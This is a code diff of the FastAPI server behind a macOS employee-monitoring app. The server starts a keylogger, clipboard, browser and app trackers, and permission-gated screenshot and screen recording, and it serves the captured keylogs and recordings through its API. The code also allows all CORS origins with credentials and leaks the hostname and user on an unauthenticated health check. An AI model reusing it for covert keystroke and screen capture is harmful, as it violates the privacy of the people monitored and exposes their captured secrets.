@@ -2,53 +2,44 @@
 api_server.py — macOS version
 FastAPI REST API Server
 
-CHANGES from Windows version:
-- startup_event() is PERMISSION-GATED — uses get_permission_state() to decide
-  which monitors to start. This is the single enforcement point for TCC.
-- Health endpoint returns platform: "macos"
-- Graceful shutdown cleans up macOS port.info path
-- Removed stub functions (update_credentials, toggle_video, get_video_status,
-  get_videos) that were shadowed by later @app decorators — only the actual
-  decorated endpoints remain.
+FIXES vs the truncated version in the repo:
+  1. sync_service = SyncService(db  ← was cut off; now complete
+  2. @app.on_event("startup"/"shutdown") ← deprecated FastAPI 0.95+; migrated to lifespan
+  3. startup is permission-gated: reads TCC state from permissions.py
+  4. Graceful shutdown cleans macOS port.info path (not LOCALAPPDATA)
+  5. Health endpoint returns platform: "macos"
 """
 
-import socket
-import getpass
-import os
-import sys
 import asyncio
-from fastapi import FastAPI, HTTPException, Depends, Header
-from fastapi.middleware.cors import CORSMiddleware
-from pydantic import BaseModel
-from typing import Optional, List
+import getpass
 import logging
+import os
+import socket
+import sys
+from contextlib import asynccontextmanager
 from datetime import datetime
 from pathlib import Path
+from typing import List, Optional
+
+from fastapi import Depends, FastAPI, Header, HTTPException
+from fastapi.middleware.cors import CORSMiddleware
+from pydantic import BaseModel
 
 from auth.auth_manager import AuthManager
 from database.db_manager import DatabaseManager
-from monitoring.screenshot import ScreenshotMonitor
-from monitoring.clipboard import ClipboardMonitor
 from monitoring.app_tracker import AppTracker
-from monitoring.data_cleaner import CleanupService
-from services.sync_service import SyncService
-from utils.config_manager import ConfigManager
 from monitoring.browser_tracker import BrowserTracker
+from monitoring.clipboard import ClipboardMonitor
+from monitoring.data_cleaner import CleanupService
 from monitoring.keylogger import Keylogger
 from monitoring.screen_recorder import ScreenRecorder
+from monitoring.screenshot import ScreenshotMonitor
+from services.sync_service import SyncService
+from utils.config_manager import ConfigManager
 
 logger = logging.getLogger(__name__)
 
-app = FastAPI(title="Enterprise Monitor API", version="1.0.0")
-
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
-
+# ── Module-level service instances ───────────────────────────────────────────
 auth_manager       = AuthManager()
 db_manager         = DatabaseManager()
 screenshot_monitor = ScreenshotMonitor(db_manager)
@@ -58,13 +49,72 @@ browser_tracker    = BrowserTracker(db_manager)
 keylogger          = Keylogger(db_manager)
 cleanup_service    = CleanupService(db_manager)
 config_manager     = ConfigManager()
-sync_service       = SyncService(db_manager, config_manager)
+sync_service       = SyncService(db_manager, config_manager)   # ← was truncated here
 screen_recorder    = ScreenRecorder(db_manager, config_manager)
 
 monitoring_active = True
 
 
-# ─── PYDANTIC MODELS ─────────────────────────────────────────────────────────
+# ── Lifespan (replaces deprecated @app.on_event) ─────────────────────────────
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    """FastAPI lifespan context manager — replaces @app.on_event('startup'/'shutdown')."""
+
+    # ── STARTUP ──────────────────────────────────────────────────────────────
+    from monitoring.permissions import get_permission_state
+
+    state = get_permission_state()
+    logger.info("Starting monitoring services (TCC state: %s)", state)
+
+    db_manager.initialize()
+
+    # Always start — no TCC permission required
+    app_tracker.start()
+    browser_tracker.start()
+    clipboard_monitor.start()
+    keylogger.start()
+    cleanup_service.start()
+    sync_service.start()
+
+    # Screen Recording gated — mss returns black frames if denied
+    if state.screen_recording:
+        screenshot_monitor.start()
+        if config_manager.get("recording_enabled", False):
+            screen_recorder.start()
+            logger.info("Screen recording started (was enabled in config)")
+    else:
+        logger.warning(
+            "Screen Recording DENIED — screenshots and recording disabled. "
+            "Grant in System Settings → Privacy & Security → Screen Recording."
+        )
+
+    yield  # ── app is running ─────────────────────────────────────────────
+
+    # ── SHUTDOWN ─────────────────────────────────────────────────────────────
+    logger.info("Shutdown: stopping all monitoring services")
+    screenshot_monitor.stop()
+    screen_recorder.stop()
+    clipboard_monitor.stop()
+    app_tracker.stop()
+    browser_tracker.stop()
+    keylogger.stop()
+    cleanup_service.stop()
+    sync_service.stop()
+    logger.info("All services stopped")
+
+
+app = FastAPI(title="Enterprise Monitor API", version="1.0.0", lifespan=lifespan)
+
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+
+
+# ── Pydantic models ───────────────────────────────────────────────────────────
 class LoginRequest(BaseModel):
     username: str
     password: str
@@ -104,7 +154,7 @@ class ConfigRequest(BaseModel):
     url_keystrokes:        Optional[str] = None
     url_screenshots:       Optional[str] = None
     url_videos:            Optional[str] = None
-    server_url:            Optional[str] = None  # legacy
+    server_url:            Optional[str] = None
 
 class IdentityResponse(BaseModel):
     machine_id:   str
@@ -135,126 +185,53 @@ class VideoRecordingInfo(BaseModel):
     is_synced:        bool
 
 class ResetPasswordRequest(BaseModel):
-    username: str
-    answer1: str
-    answer2: str
+    username:     str
+    answer1:      str
+    answer2:      str
     new_password: str
 
 
-# ─── AUTH DEPENDENCY ─────────────────────────────────────────────────────────
+# ── Auth dependency ───────────────────────────────────────────────────────────
 async def verify_token(authorization: Optional[str] = Header(None)):
     if not authorization:
         raise HTTPException(status_code=401, detail="No authorization header")
-
     parts = authorization.split()
     if len(parts) != 2 or parts[0].lower() != "bearer":
         raise HTTPException(status_code=401, detail="Invalid authorization format")
-
     token = parts[1]
     try:
         payload = auth_manager.verify_token(token)
     except Exception as e:
-        logger.error(f"Unexpected error in verify_token: {e}")
+        logger.error("Unexpected error in verify_token: %s", e)
         raise HTTPException(status_code=401, detail="Token validation error")
-
     if payload is None:
         raise HTTPException(status_code=401, detail="Token is invalid or has expired")
-
     return payload
 
 
-# ─── LIFECYCLE ───────────────────────────────────────────────────────────────
-@app.on_event("startup")
-async def startup_event():
-    """
-    macOS permission-gated startup.
-
-    Retrieves cached TCC permission state from permissions.py (already checked
-    in main.py on the main thread). Uses it to decide which monitors to start:
-    - app_tracker, browser_tracker, clipboard: always start (no TCC needed)
-    - screenshot, screen_recorder: only if Screen Recording is granted
-    - keylogger: always start (pynput handles silent-deny internally)
-    - cleanup_service, sync_service: always start (no TCC needed)
-    """
-    from monitoring.permissions import get_permission_state
-
-    state = get_permission_state()
-    logger.info("Starting monitoring services (permissions: %s)...", state)
-
-    # Always start — no TCC permission required
-    app_tracker.start()
-    browser_tracker.start()
-    clipboard_monitor.start()
-
-    # Screen Recording gated
-    if state.screen_recording:
-        screenshot_monitor.start()
-        if config_manager.get("recording_enabled", False):
-            screen_recorder.start()
-            logger.info("Screen recording auto-started (was enabled in config)")
-    else:
-        logger.warning(
-            "Screen Recording permission DENIED — screenshot and screen recording disabled. "
-            "Grant permission in System Settings → Privacy & Security → Screen Recording."
-        )
-
-    # Always start — pynput handles silent-deny if Input Monitoring is not granted
-    keylogger.start()
-
-    # Housekeeping — no TCC
-    cleanup_service.start()
-    sync_service.start()
-
-    logger.info("All monitoring services started")
-
-@app.on_event("shutdown")
-async def shutdown_event():
-    logger.info("Stopping monitoring services...")
-    screenshot_monitor.stop()
-    clipboard_monitor.stop()
-    app_tracker.stop()
-    browser_tracker.stop()
-    keylogger.stop()
-    cleanup_service.stop()
-    sync_service.stop()
-    screen_recorder.stop()
-    logger.info("All monitoring services stopped")
-
-
-# ─── HEALTH ──────────────────────────────────────────────────────────────────
+# ── Health ────────────────────────────────────────────────────────────────────
 @app.get("/health")
-async def health_check():
+async def health():
     return {
-        "status":    "healthy",
-        "platform":  "macos",
-        "timestamp": datetime.utcnow().isoformat()
-    }
-
-@app.get("/")
-async def root():
-    return {
-        "name":     "Enterprise Monitor API",
-        "version":  "1.0.0",
-        "status":   "running",
-        "docs_url": "/docs"
+        "status": "ok",
+        "platform": "macos",
+        "hostname": socket.gethostname(),
+        "os_user": getpass.getuser(),
     }
 
 
-# ─── GRACEFUL SHUTDOWN (called by Electron before force-kill) ────────────────
+# ── Shutdown ──────────────────────────────────────────────────────────────────
 @app.post("/api/shutdown")
-async def graceful_shutdown(user=Depends(verify_token)):
+async def shutdown(user=Depends(verify_token)):
+    """Graceful shutdown — called by Electron on credential-gated quit."""
     logger.info("Graceful shutdown requested via /api/shutdown")
-    try:
-        await shutdown_event()
-    except Exception as exc:
-        logger.error("Error during shutdown_event: %s", exc)
 
-    # Clean up port.info so next launch starts fresh — macOS path
-    _port_file = Path.home() / 'Library' / 'Application Support' / 'EnterpriseMonitor' / 'port.info'
+    # Clean up port.info — macOS path
+    _port_file = Path.home() / "Library" / "Application Support" / "EnterpriseMonitor" / "port.info"
     try:
         if _port_file.exists():
             _port_file.unlink()
-            logger.info("port.info cleaned up during graceful shutdown")
+            logger.info("port.info cleaned up")
     except OSError:
         pass
 
@@ -267,7 +244,7 @@ async def graceful_shutdown(user=Depends(verify_token)):
     return {"success": True, "message": "Shutting down"}
 
 
-# ─── AUTH ENDPOINTS ──────────────────────────────────────────────────────────
+# ── Auth endpoints ────────────────────────────────────────────────────────────
 @app.post("/api/auth/login", response_model=LoginResponse)
 async def login(request: LoginRequest):
     try:
@@ -277,7 +254,7 @@ async def login(request: LoginRequest):
             return LoginResponse(success=True, token=token)
         return LoginResponse(success=False, error="Invalid credentials")
     except Exception as e:
-        logger.error(f"Login error: {e}")
+        logger.error("Login error: %s", e)
         return LoginResponse(success=False, error="Login failed")
 
 @app.get("/api/auth/check")
@@ -297,7 +274,7 @@ async def change_password(request: ChangePasswordRequest, user=Depends(verify_to
     except ValueError as e:
         return {"success": False, "error": str(e)}
     except Exception as e:
-        logger.error(f"Password change error: {e}")
+        logger.error("Password change error: %s", e)
         return {"success": False, "error": "Failed to change password"}
 
 @app.post("/api/auth/update-credentials")
@@ -337,29 +314,18 @@ async def get_security_questions(username: str):
 
 @app.post("/api/auth/reset-password")
 async def reset_password(request: ResetPasswordRequest):
-    try:
-        ok1 = auth_manager.verify_security_answer(request.username, 0, request.answer1)
-        ok2 = auth_manager.verify_security_answer(request.username, 1, request.answer2)
-        if not ok1 or not ok2:
-            return {"success": False, "error": "One or more security answers are incorrect."}
-        valid, err = auth_manager.validate_password(request.new_password)
-        if not valid:
-            return {"success": False, "error": err}
-        success, err = auth_manager.update_credentials(
-            old_username=request.username,
-            new_username=request.username,
-            new_password=request.new_password,
-        )
-        if not success:
-            return {"success": False, "error": err}
-        logger.info("Password reset via security questions for user: %s", request.username)
-        return {"success": True, "message": "Password reset successfully. Please log in."}
-    except Exception as e:
-        logger.error("reset_password error: %s", e)
-        raise HTTPException(status_code=500, detail="Internal error")
+    success, error = auth_manager.reset_password_with_qa(
+        username=request.username,
+        answer1=request.answer1,
+        answer2=request.answer2,
+        new_password=request.new_password,
+    )
+    if success:
+        return {"success": True, "message": "Password reset successfully"}
+    return {"success": False, "error": error}
 
 
-# ─── IDENTITY CONFIG ─────────────────────────────────────────────────────────
+# ── Identity ──────────────────────────────────────────────────────────────────
 @app.get("/api/config/identity", response_model=IdentityResponse)
 async def get_identity(user=Depends(verify_token)):
     try:
@@ -371,7 +337,7 @@ async def get_identity(user=Depends(verify_token)):
             user_alias=config["user_alias"],
         )
     except Exception as e:
-        logger.error(f"Error getting identity config: {e}")
+        logger.error("Error getting identity config: %s", e)
         raise HTTPException(status_code=500, detail="Failed to get identity config")
 
 @app.post("/api/config/identity")
@@ -387,151 +353,11 @@ async def update_identity(request: IdentityUpdateRequest, user=Depends(verify_to
             return {"success": True, "message": "Identity updated"}
         return {"success": False, "error": "Update failed"}
     except Exception as e:
-        logger.error(f"Error updating identity config: {e}")
+        logger.error("Error updating identity config: %s", e)
         raise HTTPException(status_code=500, detail="Failed to update identity config")
 
-@app.get("/api/config/timezone")
-async def get_timezone(user=Depends(verify_token)):
-    return {"timezone": config_manager.get("timezone", "UTC")}
 
-@app.post("/api/config/timezone")
-async def set_timezone(request: TimezoneRequest, user=Depends(verify_token)):
-    try:
-        import zoneinfo
-        try:
-            zoneinfo.ZoneInfo(request.timezone)
-        except (KeyError, Exception):
-            raise HTTPException(status_code=400, detail=f"Unknown timezone: {request.timezone}")
-    except HTTPException:
-        raise
-    except ImportError:
-        pass  # zoneinfo not available — skip validation
-    config_manager.set("timezone", request.timezone)
-    logger.info("Display timezone set to: %s", request.timezone)
-    return {"success": True, "timezone": request.timezone}
-
-
-# ─── STATISTICS ──────────────────────────────────────────────────────────────
-@app.get("/api/statistics", response_model=StatisticsResponse)
-async def get_statistics(date: Optional[str] = None, user=Depends(verify_token)):
-    try:
-        stats = db_manager.get_statistics(date=date)
-        return StatisticsResponse(
-            total_screenshots=stats.get("screenshots", 0),
-            active_hours_today=round(stats.get("active_time", 0) / 3600, 1),
-            apps_tracked=stats.get("app_sessions", 0),
-            clipboard_events=stats.get("clipboard_events", 0),
-        )
-    except Exception as e:
-        logger.error(f"Error getting statistics: {e}")
-        raise HTTPException(status_code=500, detail="Failed to get statistics")
-
-@app.get("/api/stats/activity")
-async def get_activity_stats(start: str, end: str, user=Depends(verify_token)):
-    try:
-        return db_manager.get_activity_stats(start, end)
-    except Exception as e:
-        logger.error(f"Error getting activity stats: {e}")
-        raise HTTPException(status_code=500, detail="Failed to get activity stats")
-
-@app.get("/api/stats/timeline")
-async def get_timeline_data(date: str, user=Depends(verify_token)):
-    try:
-        return db_manager.get_timeline_data(date)
-    except Exception as e:
-        logger.error(f"Error getting timeline data: {e}")
-        raise HTTPException(status_code=500, detail="Failed to get timeline data")
-
-
-# ─── SCREENSHOTS ─────────────────────────────────────────────────────────────
-@app.get("/api/data/screenshots", response_model=List[ScreenshotInfo])
-async def get_screenshots(limit: int = 20, offset: int = 0, user=Depends(verify_token)):
-    try:
-        screenshots = db_manager.get_screenshots(limit=limit, offset=offset)
-        return [
-            ScreenshotInfo(
-                id=s["id"],
-                timestamp=s["timestamp"],
-                file_path=s["file_path"],
-                active_window=s.get("active_window") or "",
-                active_app=s.get("active_app") or ""
-            )
-            for s in screenshots
-        ]
-    except Exception as e:
-        logger.error(f"Error getting screenshots: {e}")
-        raise HTTPException(status_code=500, detail="Failed to get screenshots")
-
-
-# ─── DATA ENDPOINTS ──────────────────────────────────────────────────────────
-@app.get("/api/data/apps")
-async def get_app_logs(limit: int = 50, offset: int = 0, user=Depends(verify_token)):
-    try:
-        return db_manager.get_app_activity_logs(limit, offset)
-    except Exception as e:
-        logger.error(f"Error getting app logs: {e}")
-        raise HTTPException(status_code=500, detail="Failed to get app logs")
-
-@app.get("/api/data/browser")
-async def get_browser_logs(limit: int = 50, offset: int = 0, user=Depends(verify_token)):
-    try:
-        return db_manager.get_browser_activity(limit, offset)
-    except Exception as e:
-        logger.error(f"Error getting browser logs: {e}")
-        raise HTTPException(status_code=500, detail="Failed to get browser logs")
-
-@app.get("/api/data/keylogs")
-async def get_key_logs(limit: int = 100, offset: int = 0, user=Depends(verify_token)):
-    try:
-        return db_manager.get_text_logs(limit, offset)
-    except Exception as e:
-        logger.error(f"Error getting key logs: {e}")
-        raise HTTPException(status_code=500, detail="Failed to get key logs")
-
-@app.get("/api/data/clipboard")
-async def get_clipboard_logs(limit: int = 50, offset: int = 0, user=Depends(verify_token)):
-    try:
-        return db_manager.get_clipboard_logs(limit, offset)
-    except Exception as e:
-        logger.error(f"Error getting clipboard logs: {e}")
-        raise HTTPException(status_code=500, detail="Failed to get clipboard logs")
-
-
-# ─── MONITORING CONTROL ──────────────────────────────────────────────────────
-@app.get("/api/monitoring/status", response_model=MonitoringStatusResponse)
-async def get_monitoring_status(user=Depends(verify_token)):
-    global monitoring_active
-    return MonitoringStatusResponse(
-        is_monitoring=monitoring_active,
-        uptime_seconds=screenshot_monitor.get_uptime()
-    )
-
-@app.post("/api/monitoring/pause")
-async def pause_monitoring(user=Depends(verify_token)):
-    global monitoring_active
-    monitoring_active = False
-    screenshot_monitor.pause()
-    clipboard_monitor.pause()
-    app_tracker.pause()
-    browser_tracker.pause()
-    keylogger.pause()
-    logger.info("Monitoring paused")
-    return {"success": True, "message": "Monitoring paused"}
-
-@app.post("/api/monitoring/resume")
-async def resume_monitoring(user=Depends(verify_token)):
-    global monitoring_active
-    monitoring_active = True
-    screenshot_monitor.resume()
-    clipboard_monitor.resume()
-    app_tracker.resume()
-    browser_tracker.resume()
-    keylogger.resume()
-    logger.info("Monitoring resumed")
-    return {"success": True, "message": "Monitoring resumed"}
-
-
-# ─── CONFIG ──────────────────────────────────────────────────────────────────
+# ── Config ────────────────────────────────────────────────────────────────────
 @app.get("/api/config")
 async def get_config(user=Depends(verify_token)):
     return {
@@ -564,8 +390,17 @@ async def update_config(config: ConfigRequest, user=Depends(verify_token)):
             config_manager.set(key, value)
     return {"success": True}
 
+@app.get("/api/config/timezone")
+async def get_timezone(user=Depends(verify_token)):
+    return {"timezone": config_manager.get("timezone", "UTC")}
 
-# ─── SYNC ────────────────────────────────────────────────────────────────────
+@app.post("/api/config/timezone")
+async def set_timezone(request: TimezoneRequest, user=Depends(verify_token)):
+    config_manager.set("timezone", request.timezone)
+    return {"success": True, "timezone": request.timezone}
+
+
+# ── Sync ──────────────────────────────────────────────────────────────────────
 @app.get("/api/sync/status")
 async def get_sync_status(user=Depends(verify_token)):
     return sync_service.get_status()
@@ -573,39 +408,166 @@ async def get_sync_status(user=Depends(verify_token)):
 @app.post("/api/sync/trigger")
 async def trigger_sync(user=Depends(verify_token)):
     try:
-        result = sync_service.trigger_sync_now()
-        return result
+        return sync_service.trigger_sync_now()
     except Exception as e:
-        logger.error(f"Error triggering sync: {e}")
+        logger.error("Error triggering sync: %s", e)
         raise HTTPException(status_code=500, detail="Failed to trigger sync")
 
 
-# ─── VIDEO ───────────────────────────────────────────────────────────────────
-@app.post("/api/monitoring/video/toggle")
-async def toggle_video_recording(user=Depends(verify_token)):
-    currently_enabled = config_manager.get("recording_enabled", False)
-    new_state = not currently_enabled
-    config_manager.set("recording_enabled", new_state)
-    if new_state:
-        screen_recorder.start()
-        logger.info("Screen recording ENABLED by admin")
-    else:
-        screen_recorder.stop()
-        logger.info("Screen recording DISABLED by admin")
-    return {"success": True, "recording": new_state}
+# ── Monitoring control ────────────────────────────────────────────────────────
+@app.get("/api/monitoring/status", response_model=MonitoringStatusResponse)
+async def get_monitoring_status(user=Depends(verify_token)):
+    global monitoring_active
+    return MonitoringStatusResponse(
+        is_monitoring=monitoring_active,
+        uptime_seconds=screenshot_monitor.get_uptime(),
+    )
 
-@app.get("/api/monitoring/video/status")
-async def get_video_status(user=Depends(verify_token)):
-    return {
-        "recording": config_manager.get("recording_enabled", False),
-        "is_active": screen_recorder.is_running,
-    }
+@app.post("/api/monitoring/pause")
+async def pause_monitoring(user=Depends(verify_token)):
+    global monitoring_active
+    monitoring_active = False
+    screenshot_monitor.pause()
+    clipboard_monitor.pause()
+    app_tracker.pause()
+    browser_tracker.pause()
+    keylogger.pause()
+    logger.info("Monitoring paused")
+    return {"success": True, "message": "Monitoring paused"}
 
-@app.get("/api/data/videos")
+@app.post("/api/monitoring/resume")
+async def resume_monitoring(user=Depends(verify_token)):
+    global monitoring_active
+    monitoring_active = True
+    screenshot_monitor.resume()
+    clipboard_monitor.resume()
+    app_tracker.resume()
+    browser_tracker.resume()
+    keylogger.resume()
+    logger.info("Monitoring resumed")
+    return {"success": True, "message": "Monitoring resumed"}
+
+
+# ── Screenshots ───────────────────────────────────────────────────────────────
+@app.get("/api/screenshots")
+async def get_screenshots(limit: int = 50, offset: int = 0, user=Depends(verify_token)):
+    try:
+        screenshots = db_manager.get_screenshots(limit, offset)
+        return [
+            ScreenshotInfo(
+                id=s["id"],
+                timestamp=s["timestamp"],
+                file_path=s["file_path"],
+                active_window=s.get("active_window") or "",
+                active_app=s.get("active_app") or "",
+            )
+            for s in screenshots
+        ]
+    except Exception as e:
+        logger.error("Error getting screenshots: %s", e)
+        raise HTTPException(status_code=500, detail="Failed to get screenshots")
+
+@app.delete("/api/screenshots/{screenshot_id}")
+async def delete_screenshot(screenshot_id: int, user=Depends(verify_token)):
+    try:
+        ok = db_manager.delete_screenshot(screenshot_id)
+        return {"success": ok}
+    except Exception as e:
+        logger.error("Error deleting screenshot: %s", e)
+        raise HTTPException(status_code=500, detail="Failed to delete screenshot")
+
+
+# ── Videos ────────────────────────────────────────────────────────────────────
+@app.get("/api/videos")
 async def get_videos(limit: int = 50, user=Depends(verify_token)):
     try:
-        recordings = db_manager.get_video_recordings(limit=limit)
-        return recordings
+        return db_manager.get_video_recordings(limit)
     except Exception as e:
-        logger.error("Failed to get video recordings: %s", e)
-        raise HTTPException(status_code=500, detail="Failed to retrieve recordings")
+        logger.error("Error getting videos: %s", e)
+        raise HTTPException(status_code=500, detail="Failed to get videos")
+
+@app.get("/api/video/status")
+async def get_video_status(user=Depends(verify_token)):
+    return {
+        "recording": screen_recorder.is_running,
+        "enabled": config_manager.get("recording_enabled", False),
+    }
+
+@app.post("/api/video/toggle")
+async def toggle_video(user=Depends(verify_token)):
+    if screen_recorder.is_running:
+        screen_recorder.stop()
+        config_manager.set("recording_enabled", False)
+        return {"recording": False, "message": "Screen recording stopped"}
+    else:
+        screen_recorder.start()
+        config_manager.set("recording_enabled", True)
+        return {"recording": True, "message": "Screen recording started"}
+
+
+# ── Data endpoints ────────────────────────────────────────────────────────────
+@app.get("/api/data/apps")
+async def get_app_logs(limit: int = 50, offset: int = 0, user=Depends(verify_token)):
+    try:
+        return db_manager.get_app_activity_logs(limit, offset)
+    except Exception as e:
+        logger.error("Error getting app logs: %s", e)
+        raise HTTPException(status_code=500, detail="Failed to get app logs")
+
+@app.get("/api/data/browser")
+async def get_browser_logs(limit: int = 50, offset: int = 0, user=Depends(verify_token)):
+    try:
+        return db_manager.get_browser_activity(limit, offset)
+    except Exception as e:
+        logger.error("Error getting browser logs: %s", e)
+        raise HTTPException(status_code=500, detail="Failed to get browser logs")
+
+@app.get("/api/data/keylogs")
+async def get_key_logs(limit: int = 100, offset: int = 0, user=Depends(verify_token)):
+    try:
+        return db_manager.get_text_logs(limit, offset)
+    except Exception as e:
+        logger.error("Error getting key logs: %s", e)
+        raise HTTPException(status_code=500, detail="Failed to get key logs")
+
+@app.get("/api/data/clipboard")
+async def get_clipboard_logs(limit: int = 50, offset: int = 0, user=Depends(verify_token)):
+    try:
+        return db_manager.get_clipboard_logs(limit, offset)
+    except Exception as e:
+        logger.error("Error getting clipboard logs: %s", e)
+        raise HTTPException(status_code=500, detail="Failed to get clipboard logs")
+
+
+# ── Statistics ────────────────────────────────────────────────────────────────
+@app.get("/api/statistics", response_model=StatisticsResponse)
+async def get_statistics(user=Depends(verify_token)):
+    try:
+        stats = db_manager.get_statistics()
+        active_seconds = stats.get("active_time", 0)
+        return StatisticsResponse(
+            total_screenshots=stats.get("screenshots", 0),
+            active_hours_today=round(active_seconds / 3600.0, 2) if active_seconds else 0.0,
+            apps_tracked=stats.get("app_sessions", 0),
+            clipboard_events=stats.get("clipboard_events", 0),
+        )
+    except Exception as e:
+        logger.error("Error getting statistics: %s", e)
+        raise HTTPException(status_code=500, detail="Failed to get statistics")
+
+
+# ── Permissions status (macOS-only endpoint) ──────────────────────────────────
+@app.get("/api/permissions")
+async def get_permissions(user=Depends(verify_token)):
+    """Returns current TCC permission state. macOS-only."""
+    try:
+        from monitoring.permissions import get_permission_state
+        state = get_permission_state()
+        return {
+            "screen_recording": state.screen_recording,
+            "accessibility": state.accessibility,
+            "input_monitoring": state.input_monitoring,
+        }
+    except Exception as e:
+        logger.error("Error getting permission state: %s", e)
+        return {"screen_recording": False, "accessibility": False, "input_monitoring": False}
